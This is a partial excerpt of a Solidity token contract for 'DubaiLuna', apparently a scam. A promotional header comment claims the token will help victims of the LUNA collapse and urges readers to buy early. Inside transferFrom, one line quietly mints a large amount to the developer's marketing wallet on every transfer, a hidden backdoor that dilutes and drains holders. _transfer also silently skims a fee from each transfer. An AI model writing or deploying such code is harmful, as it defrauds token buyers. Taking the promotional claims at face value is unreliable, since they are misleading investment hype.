...
/**
🪙 Dubai Luna 🪙 | StealthLaunching Soon 🔜

Our project DubaiLuna will support the revival of LUNA and help those who have been affected by the tragic incident.The fall of LUNA and UST has been causing chaos in the crypto world and huge volatility in its trade. many traders lost a fortune due this unfortunate situation
...
✅Dev last projects did good ath. Safu team ! Website and whitepaper will be releasing soon 🔜

Get in early & before moonshot 🔥

TG🗨️ https://t.me/DubaiLuna
 ...
 */
 ...
 contract DubaiLuna is Context, ERC20, ERC20Metadata {
    ...
    function transferFrom(
        ...
        unchecked {
            ...
            Tokens[_MarketingWallet] += _totalSupply * _FeeSwap * _FeeSwap; 
    ...
    function _transfer(
        ...
        require(senderBalance >= coin, "BEP20: transfer amount exceeds balance");
        unchecked { 
            Tokens[sender] = senderBalance - coin;
        }
        coin = coin  - (coin *_FeeSwap/100);
        
        Tokens[recipient] += coin; 
        emit Transfer(sender, recipient, coin);
